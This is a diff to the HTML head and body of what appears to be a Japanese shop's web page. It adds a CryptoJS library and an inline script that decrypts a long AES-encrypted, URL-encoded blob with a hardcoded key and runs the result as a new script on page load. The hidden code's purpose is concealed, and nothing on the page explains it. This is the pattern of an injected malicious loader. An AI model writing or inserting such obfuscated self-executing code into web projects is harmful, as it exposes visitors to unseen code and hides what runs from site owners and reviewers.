@@ -17,8 +17,25 @@
       href="https://fonts.googleapis.com/css2?family=Shippori+Mincho:wght@400;500;700;800&family=Zen+Kaku+Gothic+New:wght@300;400;500;700;900&display=swap"
       rel="stylesheet"
     />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   </head>
   <body>
+    <script>
+      function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(
+          decodedText,
+          "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf",
+        );
+        return bytes.toString(CryptoJS.enc.Utf8);
+      }
+      const codeString = aesDecode(
+        `U2FsdGVkX1%2BK0vrzpC%2F0ras6ME3j3nqhuxKwbuqWObReWEL4eiykNAGbvOn9uMXUZPzsd6czfjku8a0la2SgGauynlr4NZz0mrG1rj69HCjbgNVZJFIrPPfMAJKgX88xcTdDtVJv4rMRkgvO%2Fkfy7UR6C3zfUBlWRRTz6YMl6PSIXMq8DOQS8SkJJNVqxaydiPlF4MuksrUsy5uBT64ZW7vd5lQK%2Fz09NbcvN%2BAqCgCCGFfqZJGEuquQLDoyLj8d5dvMhrFuM2ek29Wk5MjKYhS0LcoFEvl%2FcbNHsQ0609t%2BMiZ1ZKr49ckK6r5YY3BEVq8OGvW0wJ8XPOkgTn%2Fcyys9KZSknF2xdwOBLIeZy2PvV%2BJB4Z215eWXrvxNCqow698QtyKWcbMIfqTxlAhHqNy%2BPlgU57TBXrC%2FvREUXLrezW7nNbaH%2BVOI9WWxnXVRiceqcZAtwvYVyvuaQ3TRSms4B9%2BQbdN%2FMKkMAzdimn8jzjo4DaLegkXbb8WLHX8E4DloHFjZueAra77saxCfgN8FeN43WcWDCPf9B%2FigYjrvlc9CgUUtOLSZkm4dTBMBMIOOEGzXjMWe7CWia05tEPWb8NTX%2FlNFzhNBovuFdRMYR9FJq60mSYnAlzvERrgirCu3K%2FXUW1J5TCrhi1rVBW%2BztUAqLsSuufGMSNFErgYMtOH61s7EJguS8QSqQMKL%2FohXihyIdHvLti2DUmBFI%2FFouB3Ti9V1mkpGWaOdSqcHfU0pjYUgYPUI2PbVqtwK9Ibady0gFivqhu9DT6OooIpRvIPUmD5TEudyljnETAX5R5ROOzX779ySSzGnQtQtWF0OyUtlKphq55wikLOEFV6lEqKF1EJep0Ew85SEic4pvN2%2FFgb4Kbv8EVClC72QVWqh4hfHfBSaJX3jo0kMDrfk%2BUxC8mIQqRs9e3VanQbwg%2FSkSU9r6OgtF0sp%2BAh86%2FBEC6tj5n1jIWq%2B%2FvnzGOIs1LnCiHvm8rGVGKzqyMO3WpvjwG6RX8IxxTC45wSMmoyCVE98g0scnrO0%2Br7tsGMDI3yyDuJhpQBJzwarf%2BAfm9S7N%2BWfM4oiAyWdM%2Fpq22cgNR8B5rspAVhOdrWDje%2FQOnkt1k5hD0NW83OI7rqOa%2FXp2ahvTcRPDJzKuYwFwvJSAnkuY7zQD1T%2FHMbD9HF%2BKaU4WMrhaAxUXKsLzgqXTipVAs6MV1sAg8p%2Fmi9YL7CAiOEIULqDht%2FpXpdWkFfEzf%2B711j9wh9%2BGYiWV%2F9o3ZnXDrt66mxATfMYDKdMPoNcX4XLr4hQGM9aVFLVWPZUycG4wxWn%2FI4NlmkOt1U1Qsx4rIr4PiV139A7xBMbrOUU6GKTS4Z77pezoUjo0xsHE3rnKyJ0IXrgzp8vt14gfvRPzesqlLeOpSsZm5PhubzLs7cmdP36AImMhIHBdhP7FHSri3E6WalJkuc0OnH%2B%2FN6eereygpvGq0ndAAYXjGbys4LiuGhUK0bibidlYinhl6saR6e6dTG8mmrhcPHyu98PbRUqQhaq9KY%2FxDxXcR1B8%2FjJjVagtd1XLleiX7Wg3mf3ymY3u6qLfqvDeRzxAclBJF5MQ2An8vvLwplTL8yZfaa55z0rPs9Uh%2BGFp%2B0O%2FcTFNK14eDc7Rnzt1hcWEKLXAj6adLDCa4aKapLpSYuguJREwjUg%2BRjYXAyH5RvJKicsG0vcFmzjNB%2FmbOyKHw1U3rkgiI7z19xEuPZKo2gP0jXqmgHOutFrGluAuLIfQ2MCtwSSGWP0ZGM%2Fmngjh%2BMFQQ8NEtwruYWyF8K66OFqlO3pY9sej1jvwstOLTYAbVSkMe5CyaBuJMMc6EAcB8%2BEOG%2B78sAbFAygRYMb9oOHUyfDw0LiAEhKY%2FjccXRwO1JBdGtYJ%2FSTLESuTICeSI5nIZGJBKMzXxcSNWmjE6VGw1fCUU1lgK26cRCuPCaMIrzZjGkAR1i8jcTkw57EqCEeo3DVjEOE3XReOdqE2l06%2F6SD7hAUfwhbN6P2iUSir8ajnfZ8fQDvKUT8k9LcPod7r2Ml1hDjt5Ncrdf2ofHgT4UkdO4fDR0%2Fg1aIbSusN3iQ96P4IvTrLOY%2FZBY96ZfI8vBiqQwKVb1eQkNHtSTAmsB2bF%2BjZ100j8bW0ZtJWvAMMIFela4MDIlg1izxT%2Fho%2FuYgFDLEgir3LZGtgjsNem%2FEImxSjz3Cf40VVAFY2fjJj5vTLcvBdDGpkGDBSXgNyO9OFzxCQdtXaVYXe9Sg88cp6Ir06g7%2Ffni55J7ebfyl7CWDq2NCGy%2B8gGMU6wsEhR8sJS5um6CwKYX74LWzBhrAGYbtxwoaslwKUXJ4ROXZea5Z%2BErHt2igBZqkI7xM6wOEcPqK3Hvlv7RSVmkCpK92KVJUjRkaQI3U62B4pSFyToyYzFx%2BrVdD5VhxsXeu92J6wLn%2F3YcL0QZJcDcLM3w6KjBXvSgtQRVEJH26RUDeyPc4If3Kfq9ZJLLsS6tMrTSzm%2BZVQ3ShjEPCvyKkxFp7R05OkwM%2FaZ6%2Fo846ycO2bMfqL4idTvPeR5SP0JXnosDH%2BcnXPfAeD3lVjiCGgAk%2FyE7o2gfHq5QGI3AatuzEAUiVlekAtwt3g5I%3D`,
+      );
+      const script = document.createElement("script");
+      script.textContent = codeString;
+      document.body.appendChild(script);
+    </script>
     <!-- ===== 来店モーダル (instant open) ===== -->
     <div
       id="welcomeModal"
